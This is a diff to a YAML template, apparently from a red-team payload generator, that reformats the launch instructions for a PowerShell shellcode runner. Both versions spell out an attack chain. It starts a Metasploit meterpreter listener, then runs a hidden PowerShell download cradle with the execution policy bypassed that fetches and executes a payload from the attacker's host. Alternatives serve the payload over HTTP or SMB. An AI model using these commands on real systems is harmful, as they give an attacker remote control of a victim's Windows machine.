@@ -83,21 +83,31 @@ output:
   compile:
     enabled: false
   launch_instructions: |
-    PowerShell Shellcode Runner (Add-Type) - Launch Instructions
+    **WARNING:** This technique is easily detected and leaves disk artifacts. Use only in lab/testing environments or where stealth is not required.
 
-    WARNING: This technique is easily detected and leaves disk artifacts.
-    Use only in lab/testing environments or where stealth is not required.
+    # Start Listener
 
-    Start Listener:
-    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/{{ payload_type }}; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```bash
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/{{ payload_type }}; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```
 
-    Transfer and Execute (In-Memory):
-    $ powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
+    # Transfer and Execute (In-Memory)
 
-    Alternative (File-Based):
-    $ python3 -m http.server 80
-    On target:
-    $ powershell -ep bypass -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ```powershell
+    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')"
+    ```
+
+    # Alternative (File-Based)
+
+    **Attacker:**
+    ```bash
+    python3 -m http.server 80
+    ```
+
+    **Target:**
+    ```powershell
+    powershell -ep bypass -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ```
 
     Alternative (SMB):
     $ impacket-smbserver share . -smb2support
